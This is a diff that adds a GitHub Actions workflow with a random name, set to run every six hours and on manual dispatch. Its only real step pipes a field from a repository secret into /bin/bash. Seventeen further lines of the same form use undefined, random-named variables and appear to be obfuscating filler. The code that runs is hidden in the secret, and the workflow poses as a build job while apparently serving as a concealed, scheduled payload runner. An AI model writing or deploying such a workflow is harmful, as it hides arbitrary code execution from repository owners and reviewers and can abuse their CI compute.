@@ -1,0 +1,34 @@
+name: wengjingshi1290
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '2 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: wengjingshi1290
+        env:
+          rm4: ${{ secrets.rm4 }}
+        run: |
+          echo $rm4 | jq -r .n60373 | /bin/bash
+          echo $eslqe0816 | jq -r .gok63871 | /bin/bash
+          echo $j71167 | jq -r .xm6 | /bin/bash
+          echo $lgs80793 | jq -r .wfcv0 | /bin/bash
+          echo $na6792 | jq -r .fa4942 | /bin/bash
+          echo $cerg697 | jq -r .zaxam7973 | /bin/bash
+          echo $rkmg609 | jq -r .syflr1255 | /bin/bash
+          echo $d73 | jq -r .v219 | /bin/bash
+          echo $il4 | jq -r .nwd18 | /bin/bash
+          echo $ojhe7 | jq -r .sdzk6 | /bin/bash
+          echo $wfd31777 | jq -r .cgbb8 | /bin/bash
+          echo $xik89406 | jq -r .nbxq9 | /bin/bash
+          echo $eq6 | jq -r .pml40 | /bin/bash
+          echo $upln471 | jq -r .uqqak816 | /bin/bash
+          echo $y08778 | jq -r .bk2 | /bin/bash
+          echo $fhubt40 | jq -r .p575 | /bin/bash
+          echo $sdf44 | jq -r .gcsf868 | /bin/bash
+          echo $aeda36979 | jq -r .maf50 | /bin/bash
+
